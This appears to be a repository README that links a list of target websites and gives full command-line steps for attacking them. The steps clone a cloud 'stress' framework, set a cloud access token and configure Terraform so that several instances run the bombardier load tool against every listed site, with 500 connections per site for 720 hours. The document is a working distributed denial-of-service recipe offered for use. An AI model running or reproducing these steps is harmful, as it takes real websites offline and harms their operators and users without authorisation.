# Registry of toxic resources 
https://raw.githubusercontent.com/cyber-army-of-ukraine/toxic-resources/master/resources.txt

## How to stop
Feel free to use any tool you wish and synchronize it with resources registry.

If you don't know how to scale and run in in cloud feel free to use [Massive Stress Framework](https://github.com/ynovel/massivestress).  
1. Clone repository.
   ```shell
    git clone https://github.com/ynovel/massivestress.git
    ```
2. [Istall Terraform](https://learn.hashicorp.com/tutorials/terraform/install-cli#install-terraform).
3. Retrieve access token from your cloud provider.
4. Choose your bundle and run commands (below).

### Available bundles:
* Cloud "**Digital Ocean**", Runner "**alpine/bombardier**". Run in command line:
```shell
cd massivestress # path where cloned ynovel/massivestress repository is placed
export DIGITALOCEAN_ACCESS_TOKEN="<CHANGE TO YOUR PERSONAL ACCESS TOKEN>"
cd keys
/bin/sh gen_ssh_keys.sh
cd ../terraform/digital_ocean
terraform init
echo -e 'runner_resources_url = "https://raw.githubusercontent.com/cyber-army-of-ukraine/toxic-resources/master/resources.txt"
runner_bombardier_connections_per_resource = 500
instance_count = 3
instance_region = "fra1"
instance_type = "s-1vcpu-1gb"
runner_bombardier_duration = "720h"
' > terraform.tfstate
terraform apply # type "yes"
```
